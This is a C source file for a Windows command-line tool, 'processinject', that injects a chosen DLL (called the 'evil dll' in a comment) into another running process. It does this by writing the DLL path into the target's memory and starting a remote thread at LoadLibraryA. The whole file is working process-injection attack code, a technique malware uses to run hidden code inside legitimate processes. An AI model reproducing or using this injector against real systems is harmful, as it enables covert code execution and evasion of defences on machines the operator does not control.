#define _WIN32_WINNT _WIN32_WINNT_WINXP

#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
int main(int argc, char *argv[]){

	puts("Starting dll injection...");

	if (argc < 3){
		puts("use: processinject [process ID to infect] [dll to inject] v1.1");
		exit(1);
	}
	//get a handle to our process to inject
	printf("Attaching to process %d\n",atoi(argv[1]));
	
	// HANDLE processToInject = CreateProcess(NULL, argv[1], 0, 0, 1, 0, 0, 0, &startinfo, &processinfo);
	HANDLE processToInject = OpenProcess(PROCESS_ALL_ACCESS, 0, atoi(argv[1]));
	if (processToInject == NULL){
		puts("Failed to open process.");
		printf("error code %d",GetLastError());
	}
	

	//allocate enough memory for the name of the dll we are injecting.
	puts("Allocating Memory for name of dll to inject...");
	void * vAllocMemory =  VirtualAllocEx(processToInject, NULL, strlen(argv[2]), MEM_COMMIT, PAGE_READWRITE);
	
	if (vAllocMemory == NULL){
		puts("Failed to allocate memory for dll name.");
	}

	//write the evil dll name into memory (we will use this later as a parameter to the function LoadLibraryA)
	puts("Writing name of dll to inject into memory");
	int bytes_written = WriteProcessMemory(processToInject, vAllocMemory, argv[2], strlen(argv[2]),0);
	if (bytes_written == 0){
		puts("Failed to write name to alloced memory");
	}

	//Try and get LoadLibraryA
	puts("Getting address of loadLibraryA");
	void * load_library_address = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA");
	if (load_library_address == NULL){
		puts("Failed to get LoadLibraryA address");
	}


	//Start remote thread
	puts("Starting Thread...");
	HANDLE library_thread = CreateRemoteThread(processToInject, NULL, 0,  load_library_address, vAllocMemory, 0, NULL);
	if (library_thread == NULL){
		puts("Failed to start thread");
	}
	else{
		printf("Injection successful process pointer: %x", library_thread);
	}
	
	return 0;
}